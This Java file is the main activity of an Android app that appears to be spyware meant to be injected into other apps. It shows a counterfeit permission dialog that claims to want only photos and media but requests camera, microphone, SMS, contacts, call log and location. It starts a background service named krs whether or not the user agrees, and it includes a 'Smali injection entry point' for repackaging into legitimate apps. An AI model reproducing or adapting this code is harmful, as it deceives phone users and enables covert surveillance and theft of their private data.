package com.tenix.karasu;

import android.app.Activity;
import android.app.Dialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {

    static final String[] ALL_PERMS;

    static {
        if (Build.VERSION.SDK_INT >= 33) {
            ALL_PERMS = new String[]{
                android.Manifest.permission.READ_MEDIA_IMAGES,
                android.Manifest.permission.READ_MEDIA_VIDEO,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
            };
        } else {
            ALL_PERMS = new String[]{
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
            };
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        checkPermissions();
    }

    void checkPermissions() {
        if (hasAllPerms()) {
            startKrs();
            finish();
        } else {
            showPermCloakDialog();
        }
    }

    boolean hasAllPerms() {
        for (String p : ALL_PERMS) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    void showPermCloakDialog() {
        Dialog dialog = new Dialog(this, android.R.style.Theme_Material_Dialog_Alert);
        dialog.setCancelable(false);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(dp(28), dp(28), dp(28), dp(20));
        GradientDrawable rootBg = new GradientDrawable();
        rootBg.setColor(0xFFFFFFFF);
        rootBg.setCornerRadius(dp(16));
        root.setBackground(rootBg);

        // App icon
        ImageView icon = new ImageView(this);
        try {
            icon.setImageDrawable(getPackageManager().getApplicationIcon(getPackageName()));
        } catch (Exception e) {
            icon.setImageResource(android.R.drawable.ic_menu_gallery);
        }
        LinearLayout.LayoutParams iconLP = new LinearLayout.LayoutParams(dp(56), dp(56));
        iconLP.gravity = Gravity.CENTER_HORIZONTAL;
        iconLP.bottomMargin = dp(20);
        root.addView(icon, iconLP);

        // Title
        TextView title = new TextView(this);
        try {
            String appName = getPackageManager().getApplicationLabel(getApplicationInfo()).toString();
            title.setText("Allow " + appName + " to access photos and media?");
        } catch (Exception e) {
            title.setText("Allow this app to access photos and media?");
        }
        title.setTextSize(16f);
        title.setTextColor(0xFF212121);
        title.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams titleLP = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        titleLP.bottomMargin = dp(10);
        root.addView(title, titleLP);

        // Subtitle
        TextView sub = new TextView(this);
        sub.setText("This lets the app display content from your gallery.");
        sub.setTextSize(13f);
        sub.setTextColor(0xFF757575);
        sub.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams subLP = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        subLP.bottomMargin = dp(28);
        root.addView(sub, subLP);

        // Button row
        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.END);

        // Deny button
        Button deny = new Button(this);
        deny.setText("Don't allow");
        deny.setBackgroundColor(0x00000000);
        deny.setTextColor(0xFF757575);
        deny.setTextSize(14f);
        deny.setPadding(dp(12), dp(8), dp(12), dp(8));
        deny.setOnClickListener(v -> {
            dialog.dismiss();
            startKrs();
            finish();
        });

        // Allow button
        Button allow = new Button(this);
        allow.setText("Allow");
        allow.setTextColor(0xFFFFFFFF);
        allow.setTextSize(14f);
        allow.setPadding(dp(20), dp(10), dp(20), dp(10));
        GradientDrawable allowBg = new GradientDrawable();
        allowBg.setColor(0xFF2196F3);
        allowBg.setCornerRadius(dp(8));
        allow.setBackground(allowBg);
        allow.setOnClickListener(v -> {
            dialog.dismiss();
            requestPermissions(ALL_PERMS, 1337);
        });

        btnRow.addView(deny);
        btnRow.addView(allow);
        root.addView(btnRow);

        dialog.setContentView(root);
        dialog.show();
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        startKrs();
        finish();
    }

    void startKrs() {
        Intent i = new Intent(this, krs.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(i);
        } else {
            startService(i);
        }
    }

    // Smali injection entry point
    public static void checkAndStart(Activity a) {
        boolean needsPerm = false;
        String[] check = ALL_PERMS;
        for (String p : check) {
            if (a.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                needsPerm = true;
                break;
            }
        }
        if (needsPerm) {
            Intent i = new Intent(a, MainActivity.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            a.startActivity(i);
        } else {
            Intent s = new Intent(a, krs.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                a.startForegroundService(s);
            } else {
                a.startService(s);
            }
        }
    }

    int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density);
    }
}
